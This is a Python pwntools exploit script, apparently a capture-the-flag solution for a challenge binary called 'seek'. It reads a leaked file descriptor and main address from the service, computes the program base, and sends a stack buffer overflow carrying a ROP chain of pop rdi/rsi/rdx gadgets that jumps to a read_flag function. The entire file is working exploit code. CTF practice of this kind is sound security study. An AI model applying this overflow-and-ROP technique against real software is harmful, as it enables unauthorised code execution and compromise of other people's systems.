#!/usr/bin/env python3.8

from pwn import *
import warnings
import re

# Allows you to switch between local/GDB/remote from terminal
def connect():
    if args.GDB:
        r = gdb.debug(elf.path, gdbscript=gdbscript)
    elif args.REMOTE:
        r = remote("localhost", 6969)
    else:
        r = process([elf.path])
    return r

# Specify GDB script here (breakpoints etc)
gdbscript = """
    set follow-fork-mode child
    start
    b *main+553
"""

# Binary filename
exe = './seek'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

# =======================
# EXPLOIT AFTER THIS
# =======================
r = connect()
# libc = ELF("./libc-2.31.so", checksec=False)

# Calculate all the offsets required for exploitation
ret_addr_offset_from_buf = 104
program_base_offset_from_main = 0x8a5a
read_flag_offset_from_program_base = 0x8969
whence = 0 # SEEK_SET
offset = 76
pop_rdi_offset = 0x932f # pop rdi ; ret
pop_rsi_offset = 0x1139e # pop rsi ; ret
pop_rdx_offset = 0x8e80b # pop rdx ; pop rbx ; ret


resp = r.recvline()
fd = int(resp.rstrip().split(b" ")[2])
print(f"fd: {fd}")

# Calculate all runtime addresses from the address of main
resp = r.recvline()
MAIN = int(resp.rstrip().split(b" ")[5], 16)
PROGRAM_BASE = MAIN - program_base_offset_from_main
POP_RDI = PROGRAM_BASE + pop_rdi_offset
POP_RSI = PROGRAM_BASE + pop_rsi_offset
POP_RDX = PROGRAM_BASE + pop_rdx_offset
READ_FLAG = PROGRAM_BASE + read_flag_offset_from_program_base
print(f"main: {hex(MAIN)}\nProgram base: {hex(PROGRAM_BASE)}")
print(f"POP_RDI: {hex(POP_RDI)}\nPOP_RSI: {hex(POP_RSI)}\nPOP_RDX: {hex(POP_RDX)}")
print(f"read_flag: {hex(READ_FLAG)}")

# Create payload
payload = b"A" * ret_addr_offset_from_buf
payload += p64(POP_RDI)
payload += p64(whence)
payload += p64(POP_RSI)
payload += p64(fd)
payload += p64(POP_RDX)
payload += p64(offset)
payload += b"B" * 8 # Dummy RBX
payload += p64(READ_FLAG)

r.sendline(payload)

r.interactive()